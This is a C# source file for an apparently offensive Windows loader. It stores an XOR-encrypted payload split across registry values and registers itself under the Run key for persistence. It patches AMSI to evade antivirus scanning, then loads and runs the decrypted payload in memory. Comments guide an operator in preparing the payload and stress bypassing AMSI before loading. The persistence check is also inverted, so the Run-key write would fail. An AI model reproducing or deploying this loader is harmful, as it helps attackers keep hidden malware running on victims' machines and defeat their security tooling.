using ClrAmsiScanPatcher;
using Microsoft.Win32;
using System;
using System.Linq;
using System.Reflection;

namespace persistence
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string path = @"Software\pres";
            string exePath = Assembly.GetExecutingAssembly().Location;

            RegistryKey key = Registry.CurrentUser.OpenSubKey(path, true);

            if (key == null)
            {
                key = Registry.CurrentUser.CreateSubKey(path);

                key.SetValue("1", ""); //
                key.SetValue("2", ""); // Bytes of your payload, expected to be split in 3 parts and XOR encrypted.
                key.SetValue("3", ""); //

            }

            RegistryKey runKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

            if (runKey == null)
            {
                runKey.SetValue("Pres", exePath);
            }

            runKey.Close();

            byte xorKey = 41; // XOR key, make sure your payload has the same one, otherwise the decryption will fail and the payload won't execute.
            var parts = key.GetValueNames()
                            .OrderBy(x => x)
                            .Select(x => key.GetValue(x)?.ToString())
                            .Where(x => !string.IsNullOrEmpty(x));

            string fullBase64 = string.Concat(parts);

            byte[] encryptedBytes = Convert.FromBase64String(fullBase64);

            for (int i = 0; i < encryptedBytes.Length; i++)
            {
                encryptedBytes[i] ^= xorKey;
            }

            key.Close();

            // Patching AMSI scan function to avoid detection of the payload in memory since AMSI monitors Assembly.Load.
            AmsiPatcher patcher = new AmsiPatcher();
            patcher.Initialize();
            patcher.Patch();

            // NOTE: never use Assembly.Load without patching AMSI before.
            Assembly asm = Assembly.Load(encryptedBytes);
            asm.EntryPoint?.Invoke(null, new object[] { new string[0] });

            Console.WriteLine("\nDone.");
            Console.ReadLine();
        }
    }
}
